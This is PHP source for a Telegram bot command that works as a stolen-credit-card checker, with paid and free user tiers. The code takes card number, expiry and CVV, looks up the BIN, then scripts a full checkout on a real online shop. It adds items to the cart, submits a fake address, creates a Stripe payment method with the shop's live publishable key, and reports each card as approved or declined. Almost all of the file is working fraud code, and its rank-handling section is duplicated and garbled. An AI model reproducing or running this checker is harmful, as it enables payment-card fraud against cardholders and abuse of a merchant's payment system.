<?php
//=========RANK DETERMINE=========//

$gate = "𝙎𝙏𝙍𝙄𝙋𝙀 𝘼𝙐𝙏𝙃";
$gcm = "/ss";



$currentDate = date('Y-m-d');
$currentDate = date('Y-m-d');
$rank = "FREE";
$expiryDate = "0";

$paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
$freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
$owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

if (in_array($userId, $owners)) {
    $rank = "OWNER";
    $expiryDate = "UNTIL DEAD";
} else {
    foreach ($paidUsers as $index => $line) {
        list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
        if ($userIdFromFile == $userId) {
            if ($userExpiryDate < $currentDate) {
                unset($paidUsers[$index]); //
                file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                $freeUsers[] = $userId; // add to free users list
                file_put_contents('Database/free.txt', implode("\n", $freeUsers));
            } else    $currentDate = date('Y-m-d');
            $rank = "FREE";
            $expiryDate = "0";

            $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
            $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
            $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

            if (in_array($userId, $owners)) {
                $rank = "OWNER";
                $expiryDate = "UNTIL DEAD";
            } else {
                foreach ($paidUsers as $index => $line) {
                    list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                    if ($userIdFromFile == $userId) {
                        if ($userExpiryDate < $currentDate) {
                            unset($paidUsers[$index]);
                            file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                            $freeUsers[] = $userId;
                            file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                        } else {
                            $rank = "PAID";
                            $expiryDate = $userExpiryDate;
                        }
                    }
                }
            } {
                $rank = "PAID";
                $expiryDate = $userExpiryDate;
            }
        }
    }
}
//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//
$r = "0";

$r = rand(0, 100);
//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/ss|\.ss|!ss)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username 𝘠𝘖𝘜 𝘈𝘙𝘌 𝘕𝘖𝘛 𝘗𝘙𝘌𝘔𝘐𝘜𝘔 𝘜𝘚𝘌𝘙  ❌</b>", $message_id);
        exit();
    }
    $start_time = microtime(true);

    $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";
    $message = substr($message, 4);
    $messageidtoedit1 = bot('sendmessage', [
        'chat_id' => $chat_id,
        'text' => "<b>Processing... </b>",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id
    ]);
    $messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');

    $cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
    $mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
    $ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
    $amt = '1';
    if (empty($cc) || empty($cvv) || empty($mes) || empty($ano)) {
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "!𝙒𝙍𝙊𝙉𝙂 𝙁𝙊𝙍𝙈𝘼𝙏! 𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣                                                  - <code>$gcm cc|mm|yy|cvv</code>\n𝙂𝘼𝙏𝙀𝙒𝘼𝙔  - <b>$gate</b>",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
        return;
    };
    if (strlen($ano) == '4') {
        $an = substr($ano, 2);
    } else {
        $an = $ano;
    }
    $amount = $amt * 100;
    //------------Card info------------//
    $lista = '' . $cc . '|' . $mes . '|' . $an . '|' . $cvv . '';

  
  $ch = curl_init();

  $bin = substr($cc, 0, 6);

  curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $ch = curl_init();

    $bin = substr($cc, 0, 6);

    curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $bindata = curl_exec($ch);
    $binna = json_decode($bindata, true);
    $brand = $binna['scheme'];
    $country = $binna['country']['name'];
    $alpha2 = $binna['country']['alpha2'];
    $emoji = $binna['country']['emoji'];
    $type = $binna['type'];
    $category = $binna['category'];
    $bank = $binna['bank']['name'];
    $url = $binna['bank']['url'];
    $phone = $binna['bank']['phone'];
    curl_close($ch);

    $bank = "$bank";
    $country = "$country $emoji ";
    $bin = "$bin - ($alpha2) -[$emoji] ";
    $bininfo = "$type - $brand - $category";
    $url = "$url";
    $type = strtoupper($type);
  


  bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■□□□
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>",
          'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
  

    //------------Card info------------//

    # -------------------- [1 REQ] -------------------#

    $proxie = null;
    $pass = null;
    $cookieFile = getcwd() . '/cookies.txt';

    function getstr2($string, $start, $end)
    {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://catechdepot.com/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: catechdepot.com',
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://catechdepot.com/shop/confirmation',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: same-origin',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    ]);

    curl_setopt($ch, CURLOPT_PROXY, $proxie);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    $r2 = curl_exec($ch);
    curl_close($ch);

    $cf = getstr($r2, 'csrf_token: "', '"');
    echo "$cf--<br>";


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://catechdepot.com/shop/cart/update');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: catechdepot.com',
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9',
        'cache-control: max-age=0',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://catechdepot.com',
        'referer: https://catechdepot.com/led-flood-light-100-277-volt-5000k-knuckle-mount?category=185',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: same-origin',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_PROXY, $proxie);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrf_token=' . $cf . '&product_id=78725&quantity=1&product_custom_attribute_values=%5B%5D&variant_values=334&no_variant_attribute_values=%5B%5D&add_qty=1&express=true');

    bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■□□
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>",
          'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
  
    $r = curl_exec($ch);
    curl_close($ch);

    echo "r_ $r<br>";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://catechdepot.com/shop/address');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: catechdepot.com',
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9',
        'cache-control: max-age=0',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://catechdepot.com',
        'referer: https://catechdepot.com/shop/address',

        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: same-origin',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',

    ]);
    curl_setopt($ch, CURLOPT_PROXY, $proxie);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=jhin+vega&email=josewers20%40gmail.com&phone=9703878998&street=street+212&street2=&city=new+york&zip=10080&country_id=233&state_id=35&csrf_token=' . $cf . '&submitted=1&partner_id=186&callback=&field_required=phone%2Cname');

    $rz = curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: api.stripe.com',
        'accept: application/json',
        'accept-language: es-ES,es;q=0.9',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://js.stripe.com',
        'referer: https://js.stripe.com/',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',

    ]);
    curl_setopt($ch, CURLOPT_PROXY, $proxie);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]=' . $cc . '&card[cvc]=' . $cvv . '&card[exp_month]=' . $mes . '&card[exp_year]=' . $ano . '&guid=41936ddc-a8b5-4b0d-97a7-d7dd5136062e715399&muid=849631d5-81c7-47e1-87ea-91b4b92af8c1870d68&sid=03283b22-15d4-4227-8a27-e7fe7394968ad9bf7a&pasted_fields=number&payment_user_agent=stripe.js%2F85b73043af%3B+stripe-js-v3%2F85b73043af%3B+card-element&referrer=https%3A%2F%2Fcatechdepot.com&time_on_page=15189&key=pk_live_51I70wzLO8ShkwzuG1onxNR1mbywAZi9aXRo0BWWPnQIDbpZMsbZdL15TrxAszaUQub0IamcJ6jSawoOfdrTWeHwG00g1nv28B0');

    $rx = curl_exec($ch);
    curl_close($ch);

    $j = json_decode($rx, true);
    $id = $j['id'];
  
  bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■■□
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>",
          'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://catechdepot.com/payment/stripe/s2s/create_json_3ds');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: catechdepot.com',
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'content-type: application/json',
        'origin: https://catechdepot.com',
        'referer: https://catechdepot.com/shop/payment',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'x-requested-with: XMLHttpRequest',
    ]);
    curl_setopt($ch, CURLOPT_PROXY, $proxie);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"jsonrpc":"2.0","method":"call","params":{"data_set":"/payment/stripe/s2s/create_json_3ds","acquirer_id":"9","stripe_publishable_key":"pk_live_51I70wzLO8ShkwzuG1onxNR1mbywAZi9aXRo0BWWPnQIDbpZMsbZdL15TrxAszaUQub0IamcJ6jSawoOfdrTWeHwG00g1nv28B0","currency_id":"","return_url":"/shop/payment/validate","partner_id":"186","csrf_token":"' . $cf . '","payment_method":"' . $id . '"},"id":364109924}');

    $rx = curl_exec($ch);

    curl_close($ch);


    unlink($cookieFile);

    $msg = getstr2($rx, ', "message": " ','"');


  bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■■■
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>",
          'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
  
    $end_time = microtime(true);
    $time = number_format($end_time - $start_time, 2);
    ////////--[Responses]--////////

      if (strpos($rx, '3d_secure')) {
      $msg = 'Succeeded ';
      $es = '𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅';
         } elseif (strpos($rx, "Your card number is incorrect.")) {
              $msg = 'Your card number is incorrect 🔴';
              $es = '𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌';
         } elseif (strpos($rx, "Stripe gave us the following info about the problem: 'Your card was declined.")) {
              $msg = 'Your card was decined 🔴';
              $es = '𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌';
            } elseif (strpos($rx, "Your card was declined.")) {
              $msg = 'Your card was declined 🔴';
              $es = '𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌';
         } elseif (strpos($rx, "Stripe gave us the following info about the problem: 'Your card's security code is incorrect.'")) {
              $msg = "Your card's security code is incorrect";
              $es = '𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅';
              $msg = "You're Card's Security Code Is Incorrect 🟢";
          } elseif (strpos($rx, 'Your card has insufficient funds.')) {
              $es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
              $msg = 'Insufficuent Fund In Card';
         } elseif (strpos($rx, "Stripe gave us the following info about the problem: 'Your card does not support this type of purchase.'")) {
              $es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
              $msg = "You're Card Does Not Support This Type Of Purchase";
        
        } elseif (strpos($rx, "Stripe gave us the following info about the problem: 'Invalid account.'")) {
              $es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
              $msg = "Invaild Account";
    
          } else {
              $es = '𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌'; 
              $msg =  "$msg";


    }

    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'text' => "$es

<b>💳</b>  <code>$lista</code>
⌬ 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ <code>Stripe Auth</code>
⌬ 𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ <code>$msg</code>

⌬ 𝘽𝙄𝙉 𝙄𝙉𝙁𝙊 ↯ <code>$bininfo</code> 
⌬ 𝘽𝘼𝙉𝙆 ↯ <code>$bank</code>
⌬ 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ <code>$country</code>

𝙏𝙄𝙈𝙀 ↯ <code>$time Seconds</code>
$botu

",
        'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'
    ]);
}
